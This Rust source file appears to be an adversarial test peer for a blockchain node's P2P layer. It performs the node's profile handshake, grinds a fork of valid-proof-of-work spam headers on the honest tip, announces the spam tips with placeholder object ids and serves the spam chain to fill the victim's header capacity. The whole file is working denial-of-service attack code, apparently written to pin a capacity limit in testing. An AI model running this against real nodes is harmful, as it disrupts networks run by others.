//! Anonymous header-spam peer for the C10 HeaderDAG-capacity pin (live P2P).
//!
//! Dials one victim release node with a fresh random libp2p identity, performs
//! the real network-v7 profile handshake (harvesting the node's profile once,
//! then re-requesting with the exact expected id so the victim marks the
//! aggressor dispatchable), pulls the victim's recent honest headers over the
//! real `/sync/headers/5` protocol, grinds a fork of valid-PoW spam headers
//! on top of the honest tip, announces spam tips over `/sync/availability/1`
//! and then serves `/sync/headers/5` fetch and probe requests with slices of
//! the spam chain until killed.
//!
//! No credentials, one identity, header-only records (no body or terminal
//! objects are ever served — the spam branch is uncommittable by design).

use std::future::Future;
use std::sync::{Arc, Mutex, OnceLock};
use std::time::{Duration, Instant};

use anyhow::{bail, Context, Result};
use futures::future::poll_fn;
use futures::{AsyncReadExt, AsyncWriteExt, FutureExt};
use libp2p_core::upgrade::OutboundConnectionUpgrade;
use tokio_util::compat::TokioAsyncReadCompatExt;

#[path = "../aggressor_common.rs"]
mod aggressor_common;

#[path = "../spam_chain.rs"]
mod spam_chain;

use aggressor_common::{identify_response_bytes, negotiate_inbound, negotiate_outbound, NoiseIo};
use spam_chain::SpamChain;

const PING_PROTOCOL: &str = "/ipfs/ping/1.0.0";
const IDENTIFY_PROTOCOL: &str = "/ipfs/id/1.0.0";
const PROFILE_PROTOCOL: &str = "/noid/mainnet/860e70453390bf81/1/sync/profile/6";
const HEADERS_PROTOCOL: &str = "/noid/mainnet/860e70453390bf81/1/sync/headers/5";
const AVAILABILITY_PROTOCOL: &str = "/noid/mainnet/860e70453390bf81/1/sync/availability/1";

const HEADER_WIRE: usize = 212;
const RECORD_BYTES: usize = 288;
const ANNOUNCE_BYTES: usize = 292;
/// NHB5 response header: magic(4) + count(2) + flags(1) + status(1) +
/// retry(2) + reserved(2) + compressed_len(4) + snapshot_height(8) +
/// snapshot_hash(32), per header_sync_codec.rs.
const RESPONSE_HEADER_BYTES: usize = 56;

type YamuxConnection = yamux::Connection<NoiseIo>;

struct Shared {
    chain: Mutex<Option<Arc<SpamChain>>>,
    profile: Mutex<Option<Vec<u8>>>,
    served_fetches: Mutex<u64>,
    served_records: Mutex<u64>,
    announced: Mutex<u64>,
}

fn make_shared() -> Shared {
    Shared {
        chain: Mutex::new(None),
        profile: Mutex::new(None),
        served_fetches: Mutex::new(0),
        served_records: Mutex::new(0),
        announced: Mutex::new(0),
    }
}

static SHARED: OnceLock<Arc<Shared>> = OnceLock::new();

fn shared() -> Arc<Shared> {
    Arc::clone(SHARED.get_or_init(|| Arc::new(make_shared())))
}

/// Answer one inbound `/sync/headers/5` request with a slice of our chain.
async fn serve_header_request(stream: &mut yamux::Stream, state: &Shared) {
    let mut request = [0u8; 16];
    if stream.read_exact(&mut request).await.is_err() {
        return;
    }
    if request[..4] != *b"NHQ5" {
        return;
    }
    let start_height = u64::from_le_bytes(request[4..12].try_into().expect("u64"));
    let count = u16::from_le_bytes(request[12..14].try_into().expect("u16")) as usize;
    let chain = state.chain.lock().expect("chain").clone();
    let (records, canonical): (usize, Vec<u8>) = match chain.as_ref() {
        Some(chain) if start_height >= chain.base_height => {
            let mut canonical = Vec::with_capacity(count.min(512) * RECORD_BYTES);
            let mut records = 0usize;
            for h in start_height..start_height + count as u64 {
                match chain.header_at(h) {
                    Some(header) => {
                        canonical.extend_from_slice(&header.to_bytes());
                        canonical.extend_from_slice(&[0u8; RECORD_BYTES - HEADER_WIRE]);
                        records += 1;
                    }
                    None => break,
                }
            }
            (records, canonical)
        }
        _ => (0, Vec::new()),
    };
    let compressed = zstd::bulk::compress(&canonical, 1).expect("header compress");
    let mut out = Vec::with_capacity(RESPONSE_HEADER_BYTES + compressed.len());
    out.extend_from_slice(b"NHB5");
    out.extend_from_slice(&(records as u16).to_le_bytes());
    out.push(0u8); // flags: no snapshot boundary
    out.push(0u8); // status: Ready
    out.extend_from_slice(&0u16.to_le_bytes()); // retry
    out.extend_from_slice(&0u16.to_le_bytes()); // reserved
    out.extend_from_slice(&(compressed.len() as u32).to_le_bytes());
    out.extend_from_slice(&0u64.to_le_bytes()); // snapshot height
    out.extend_from_slice(&[0u8; 32]); // snapshot hash
    out.extend_from_slice(&compressed);
    let _ = stream.write_all(&out).await;
    let _ = stream.flush().await;
    let _ = stream.close().await;
    *state.served_fetches.lock().expect("counter") += 1;
    *state.served_records.lock().expect("counter") += records as u64;
    println!(
        "[aggressor] served headers fetch start={start_height} count={count} records={records}"
    );
}

/// Build the NHA2 availability announcement for one spam header.
fn announcement_bytes(header: &noid_chain::BlockHeader) -> [u8; ANNOUNCE_BYTES] {
    let mut out = [0u8; ANNOUNCE_BYTES];
    out[..4].copy_from_slice(b"NHA2");
    out[4..4 + HEADER_WIRE].copy_from_slice(&header.to_bytes());
    // Body object id: arbitrary digest, length 1 (>= 1 and <= wire caps).
    out[216..248].copy_from_slice(&[0xB0; 32]);
    out[248..252].copy_from_slice(&1u32.to_le_bytes());
    // Terminal object id: arbitrary digest, length 1.
    out[252..284].copy_from_slice(&[0xB1; 32]);
    out[284..288].copy_from_slice(&1u32.to_le_bytes());
    // proof class 0; provider flags: BODY | TERMINAL.
    out[288] = 0;
    out[289] = 0b11;
    out
}

/// Drive the connection (answering inbound streams) while `fut` runs.
async fn conn_aware<F>(connection: &mut YamuxConnection, mut fut: F) -> Result<F::Output>
where
    F: Future + Unpin,
{
    let state = shared();
    poll_fn(move |cx| {
        loop {
            match connection.poll_next_inbound(cx) {
                std::task::Poll::Ready(Some(stream)) => {
                    let state = Arc::clone(&state);
                    tokio::spawn(async move {
                        let Ok(mut stream) = stream else {
                            return;
                        };
                        let supported = [
                            PING_PROTOCOL,
                            IDENTIFY_PROTOCOL,
                            PROFILE_PROTOCOL,
                            HEADERS_PROTOCOL,
                        ];
                        if let Ok(Some(protocol)) = negotiate_inbound(&mut stream, &supported).await
                        {
                            if protocol == PING_PROTOCOL {
                                let mut buffer = [0u8; 32];
                                while stream.read_exact(&mut buffer).await.is_ok() {
                                    if stream.write_all(&buffer).await.is_err()
                                        || stream.flush().await.is_err()
                                    {
                                        break;
                                    }
                                }
                            } else if protocol == IDENTIFY_PROTOCOL {
                                let response = identify_response_bytes();
                                let _ = stream.write_all(&response).await;
                                let _ = stream.flush().await;
                                let _ = stream.close().await;
                            } else if protocol == PROFILE_PROTOCOL {
                                let mut request = [0u8; 36];
                                if stream.read_exact(&mut request).await.is_ok()
                                    && request[..4] == *b"NPQ6"
                                {
                                    let profile = state.profile.lock().expect("profile").clone();
                                    if let Some(profile) = profile {
                                        let mut out = Vec::with_capacity(4 + profile.len());
                                        out.extend_from_slice(b"NPS6");
                                        out.extend_from_slice(&profile);
                                        let _ = stream.write_all(&out).await;
                                        let _ = stream.flush().await;
                                    }
                                }
                                let _ = stream.close().await;
                            } else if protocol == HEADERS_PROTOCOL {
                                serve_header_request(&mut stream, &state).await;
                            }
                        }
                    });
                    continue;
                }
                std::task::Poll::Ready(None) => {
                    return std::task::Poll::Ready(Err(anyhow::anyhow!(
                        "yamux connection closed by remote"
                    )))
                }
                std::task::Poll::Pending => break,
            }
        }
        fut.poll_unpin(cx).map(Ok)
    })
    .await
}

async fn open_stream(connection: &mut YamuxConnection) -> Result<yamux::Stream> {
    poll_fn(|cx| connection.poll_new_outbound(cx))
        .await
        .map_err(|e| anyhow::anyhow!("yamux open: {e:?}"))
}

/// Two-round profile handshake: harvest (any expected id), then verify with
/// the exact id. Returns the profile payload (bytes after the NPS6 magic:
/// 84 parameter bytes then the 32-byte profile id; the full NPS6 frame is
/// 120 bytes). The request frame is 36 bytes; the server's codec runs
/// `ensure_eof` after it, so the send half is closed before reading — an
/// honest libp2p request-response client closes its send half the same way.
async fn profile_round(
    connection: &mut YamuxConnection,
    expected_id: Option<[u8; 32]>,
) -> Result<Vec<u8>> {
    let mut stream = open_stream(connection).await?;
    let round = async move {
        negotiate_outbound(&mut stream, PROFILE_PROTOCOL).await?;
        let mut req = vec![0u8; 36];
        req[..4].copy_from_slice(b"NPQ6");
        if let Some(id) = expected_id {
            req[4..36].copy_from_slice(&id);
        }
        stream.write_all(&req).await?;
        stream.flush().await?;
        stream.close().await?;
        let mut response = vec![0u8; 120];
        stream.read_exact(&mut response).await?;
        anyhow::Ok(response)
    };
    let response = conn_aware(connection, Box::pin(round)).await??;
    if response[..4] != *b"NPS6" {
        bail!("profile response magic mismatch");
    }
    Ok(response[4..].to_vec())
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<()> {
    let mut args: Vec<String> = std::env::args().skip(1).collect();
    let addr = args.first().cloned().context(
        "usage: anon-header-pin 127.0.0.1:PORT --rpc URL [--spam-count N] [--threads N] [--announce 100,200,...] [--harvest-count N]",
    )?;
    args.remove(0);
    let mut rpc = String::new();
    let mut spam_count = 511u64;
    let mut threads = 10usize;
    let mut announce = String::from("100,200,300,400,493");
    let mut harvest_count = 65u64;
    while !args.is_empty() {
        let flag = args.remove(0);
        let value = args.first().cloned().context("flag missing value")?;
        args.remove(0);
        match flag.as_str() {
            "--rpc" => rpc = value,
            "--spam-count" => spam_count = value.parse()?,
            "--threads" => threads = value.parse()?,
            "--announce" => announce = value,
            "--harvest-count" => harvest_count = value.parse()?,
            other => bail!("unknown flag {other}"),
        }
    }
    let state = shared();

    // ---- RPC: current height ----
    let client = reqwest::Client::new();
    let info: serde_json::Value = client
        .post(&rpc)
        .json(&serde_json::json!({
            "jsonrpc": "2.0", "id": 1,
            "method": "paranoid_getChainInfo",
            "params": []
        }))
        .send()
        .await
        .context("getChainInfo request")?
        .json()
        .await
        .context("getChainInfo body")?;
    let height = info["result"]["height"].as_u64().context("height missing")?;
    println!("[aggressor] victim height = {height}");

    // ---- Transport: TCP + noise + yamux with one fresh identity ----
    let started = Instant::now();
    let tcp = tokio::net::TcpStream::connect(&addr)
        .await
        .with_context(|| format!("connect {addr}"))?;
    let mut plain = tcp.compat();
    negotiate_outbound(&mut plain, "/noise").await?;
    let identity = libp2p_identity::Keypair::from(libp2p_identity::ed25519::Keypair::generate());
    let noise = libp2p_noise::Config::new(&identity)?;
    let (_peer, noise_io) = noise.upgrade_outbound(plain, "/noise").await?;
    let mut noise_io = noise_io;
    negotiate_outbound(&mut noise_io, "/yamux/1.0.0").await?;
    let mut connection =
        yamux::Connection::new(noise_io, yamux::Config::default(), yamux::Mode::Client);
    println!(
        "[aggressor] transport up (noise+yamux, one fresh identity) in {:?}",
        started.elapsed()
    );

    // ---- Phase 1: profile harvest + verification ----
    let profile = profile_round(&mut connection, None).await?;
    let mut expected_id = [0u8; 32];
    // The returned payload is PROFILE_BYTES (84) || profile_id (32); the id
    // is the trailing 32 bytes.
    expected_id.copy_from_slice(&profile[84..116]);
    let profile = profile_round(&mut connection, Some(expected_id)).await?;
    *state.profile.lock().expect("profile") = Some(profile);
    println!("[aggressor] network-v7 profile harvested and verified");

    // ---- Phase 2: harvest the victim's honest headers ----
    let harvest_start = height.saturating_sub(harvest_count - 1);
    let mut stream = open_stream(&mut connection).await?;
    let harvest = async move {
        negotiate_outbound(&mut stream, HEADERS_PROTOCOL).await?;
        let mut req = [0u8; 16];
        req[..4].copy_from_slice(b"NHQ5");
        req[4..12].copy_from_slice(&harvest_start.to_le_bytes());
        req[12..14].copy_from_slice(&(harvest_count as u16).to_le_bytes());
        req[14] = 0;
        stream.write_all(&req).await?;
        stream.flush().await?;
        stream.close().await?;
        let mut header = [0u8; RESPONSE_HEADER_BYTES];
        stream.read_exact(&mut header).await?;
        if header[..4] != *b"NHB5" {
            bail!("header harvest response magic mismatch");
        }
        let count = u16::from_le_bytes(header[4..6].try_into().expect("count")) as usize;
        let compressed_len = u32::from_le_bytes(header[12..16].try_into().expect("len")) as usize;
        let mut compressed = vec![0u8; compressed_len];
        stream.read_exact(&mut compressed).await?;
        let canonical_len = count * RECORD_BYTES;
        let mut decoder = zstd::bulk::Decompressor::new().expect("decoder");
        decoder
            .window_log_max(21)
            .map_err(|e| anyhow::anyhow!("window: {e:?}"))?;
        let payload = decoder
            .decompress(&compressed, canonical_len)
            .map_err(|e| anyhow::anyhow!("decompress: {e:?}"))?;
        if payload.len() != canonical_len {
            bail!("harvest payload length mismatch");
        }
        let mut headers = Vec::with_capacity(count);
        for chunk in payload.chunks_exact(RECORD_BYTES) {
            headers.push(
                noid_chain::BlockHeader::from_bytes(&chunk[..HEADER_WIRE])
                    .map_err(|e| anyhow::anyhow!("decode honest header: {e:?}"))?,
            );
        }
        anyhow::Ok(headers)
    };
    let honest = conn_aware(&mut connection, Box::pin(harvest)).await??;
    println!(
        "[aggressor] harvested {} honest headers h{}..h{}",
        honest.len(),
        honest.first().map(|h| h.height).unwrap_or(0),
        honest.last().map(|h| h.height).unwrap_or(0)
    );
    if honest.last().map(|h| h.height) != Some(height) {
        bail!("honest harvest did not reach the victim tip");
    }

    // ---- Phase 3: grind the spam fork ----
    let grind_started = Instant::now();
    let grind = tokio::task::spawn_blocking(move || {
        SpamChain::build(honest, spam_count, threads, |done| {
            println!("[aggressor] ground {done}/{spam_count} headers");
        })
    });
    let chain = conn_aware(&mut connection, Box::pin(grind)).await???;
    let chain = Arc::new(chain);
    *state.chain.lock().expect("chain") = Some(Arc::clone(&chain));
    println!(
        "[aggressor] grind complete: {spam_count} valid-PoW headers in {:?}",
        grind_started.elapsed()
    );

    // ---- Phase 4: announce the spam tips ----
    let tips: Vec<u64> = announce
        .split(',')
        .filter_map(|s| s.trim().parse().ok())
        .collect();
    for tip_offset in tips {
        let tip_height = height + tip_offset;
        let Some(header) = chain.header_at(tip_height) else {
            println!("[aggressor] tip h{tip_height} not built, skipping");
            continue;
        };
        let announcement = announcement_bytes(header);
        let mut stream = open_stream(&mut connection).await?;
        let push = async move {
            negotiate_outbound(&mut stream, AVAILABILITY_PROTOCOL).await?;
            stream.write_all(&announcement).await?;
            stream.flush().await?;
            // The availability codec runs ensure_eof after the fixed request
            // frame; close the send half before reading the 5-byte status.
            stream.close().await?;
            let mut response = [0u8; 5];
            stream.read_exact(&mut response).await?;
            anyhow::Ok(response)
        };
        let response = conn_aware(&mut connection, Box::pin(push)).await??;
        *state.announced.lock().expect("counter") += 1;
        let status = if response[4] == 0 { "Accepted" } else { "Busy" };
        println!("[aggressor] announced spam tip h{tip_height} (offset +{tip_offset}): {status}");
        let sleep = Box::pin(tokio::time::sleep(Duration::from_millis(1500)));
        conn_aware(&mut connection, sleep).await?;
    }
    println!("[aggressor] fill phase complete; parking and serving probes until killed");

    // ---- Phase 5: park forever, serving inbound header fetches/probes ----
    loop {
        let idle = Box::pin(futures::future::pending::<()>());
        if conn_aware(&mut connection, idle).await.is_err() {
            println!(
                "[aggressor] connection closed; stats: fetches={} records={} announces={}",
                *state.served_fetches.lock().expect("c"),
                *state.served_records.lock().expect("c"),
                *state.announced.lock().expect("c"),
            );
            bail!("victim closed the connection");
        }
    }
}
